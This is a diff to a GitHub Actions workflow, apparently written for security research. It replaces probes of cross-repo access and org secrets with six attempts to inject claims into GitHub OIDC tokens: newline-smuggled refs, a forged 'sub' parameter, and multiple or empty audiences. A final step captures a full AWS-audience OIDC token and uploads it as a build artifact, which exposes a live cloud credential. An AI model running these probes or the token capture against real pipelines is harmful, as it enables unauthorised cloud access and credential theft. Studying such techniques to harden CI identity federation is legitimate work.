@@ -10,38 +10,113 @@ jobs:
     runs-on: ubuntu-latest
     environment: production
     steps:
-      - name: Test cross-org repo access with GITHUB_TOKEN
-        env:
-          GH_TOKEN: ${{ github.token }}
+      - name: Test 1 - Standard audience
         run: |
-          echo "=== Testing GITHUB_TOKEN cross-repo access ==="
-          echo "Current repo: $GITHUB_REPOSITORY"
-          
-          # Try to list the private companion repo's contents
-          RESULT=$(curl -s -o /dev/null -w "%{http_code}" \
-            -H "Authorization: token $GH_TOKEN" \
-            "https://api.github.com/repos/hasskoelhadi96-ops/oidc-test-private-companion/contents/")
-          echo "Access to private companion repo: HTTP $RESULT"
-          
-          # Try to list org repos
-          RESULT2=$(curl -s -o /dev/null -w "%{http_code}" \
-            -H "Authorization: token $GH_TOKEN" \
-            "https://api.github.com/orgs/hasskoelhadi96-ops/repos")
-          echo "Access to org repos list: HTTP $RESULT2"
-          
-          # Try to read org secrets list
-          RESULT3=$(curl -s -o /dev/null -w "%{http_code}" \
-            -H "Authorization: token $GH_TOKEN" \
-            "https://api.github.com/orgs/hasskoelhadi96-ops/actions/secrets")
-          echo "Access to org secrets list: HTTP $RESULT3"
-          
-          # Get the actual token info
-          curl -s -H "Authorization: token $GH_TOKEN" \
-            "https://api.github.com/rate_limit" | jq '.resources.core | {limit, remaining}'
-      
-      - name: Upload cross-repo test results as artifact
-        uses: actions/upload-artifact@v4
+          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
+          PAYLOAD=$(echo "$T" | cut -d. -f2)
+          echo "=== Test 1: Standard audience ==="
+          echo "$PAYLOAD" | python3 -c "
+import sys,base64,json
+d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
+c=json.loads(base64.urlsafe_b64decode(p))
+print('aud:', c.get('aud'))
+print('sub:', c.get('sub'))
+print('event:', c.get('event_name'))"
+
+      - name: Test 2 - Audience newline injection
+        run: |
+          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com%0aref%3Arefs%2Fheads%2Fmain" | jq -r .value)
+          PAYLOAD=$(echo "$T" | cut -d. -f2)
+          echo "=== Test 2: Newline injection audience ==="
+          echo "$PAYLOAD" | python3 -c "
+import sys,base64,json
+d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
+try:
+  c=json.loads(base64.urlsafe_b64decode(p))
+  print('aud:', repr(c.get('aud')))
+  print('sub:', c.get('sub'))
+except Exception as e:
+  print('Error decoding:', e)" 2>/dev/null || echo "Test 2: Token request rejected or failed"
+
+      - name: Test 3 - Sub parameter injection attempt
+        run: |
+          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com&sub=attacker-injected-PWNED" | jq -r .value)
+          PAYLOAD=$(echo "$T" | cut -d. -f2)
+          echo "=== Test 3: Sub param injection ==="
+          echo "$PAYLOAD" | python3 -c "
+import sys,base64,json
+d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
+try:
+  c=json.loads(base64.urlsafe_b64decode(p))
+  print('aud:', c.get('aud'))
+  print('sub:', c.get('sub'))
+except Exception as e:
+  print('Error:', e)" 2>/dev/null || echo "Test 3: Token request rejected or failed"
+
+      - name: Test 4 - Comma-separated audiences
+        run: |
+          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com%2Chttps%3A%2F%2Faccounts.google.com" | jq -r .value)
+          PAYLOAD=$(echo "$T" | cut -d. -f2)
+          echo "=== Test 4: Comma-separated audiences ==="
+          echo "$PAYLOAD" | python3 -c "
+import sys,base64,json
+d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
+try:
+  c=json.loads(base64.urlsafe_b64decode(p))
+  print('aud:', repr(c.get('aud')))
+  print('sub:', c.get('sub'))
+except Exception as e:
+  print('Error:', e)" 2>/dev/null || echo "Test 4: Failed"
+
+      - name: Test 5 - Empty audience
+        run: |
+          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=" | jq -r .value)
+          PAYLOAD=$(echo "$T" | cut -d. -f2)
+          echo "=== Test 5: Empty audience ==="
+          echo "$PAYLOAD" | python3 -c "
+import sys,base64,json
+d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
+try:
+  c=json.loads(base64.urlsafe_b64decode(p))
+  print('aud:', repr(c.get('aud')))
+  print('sub:', c.get('sub'))
+except Exception as e:
+  print('Error:', e)" 2>/dev/null || echo "Test 5: Failed"
+
+      - name: Test 6 - JSON array audience injection
+        run: |
+          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=%5B%22sts.amazonaws.com%22%2C%22https%3A%2F%2Faccounts.google.com%22%5D" | jq -r .value)
+          PAYLOAD=$(echo "$T" | cut -d. -f2)
+          echo "=== Test 6: JSON array audience ==="
+          echo "$PAYLOAD" | python3 -c "
+import sys,base64,json
+d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
+try:
+  c=json.loads(base64.urlsafe_b64decode(p))
+  print('aud:', repr(c.get('aud')))
+except Exception as e:
+  print('Error:', e)" 2>/dev/null || echo "Test 6: Failed"
+
+      - name: Full OIDC token capture
+        run: |
+          FULL_JWT=$(curl -sS \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
+          echo "$FULL_JWT" > /tmp/oidc_token.txt
+          PAYLOAD=$(echo "$FULL_JWT" | cut -d. -f2)
+          echo "$PAYLOAD" | python3 -c "
+import sys, base64, json
+d = sys.stdin.read().strip()
+p = d + '=' * (4 - len(d) % 4)
+print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2))"
+      - uses: actions/upload-artifact@v4
         with:
-          name: cross-repo-test-results
-          path: /dev/null
+          name: oidc-audience-test-results
+          path: /tmp/oidc_token.txt
           retention-days: 1
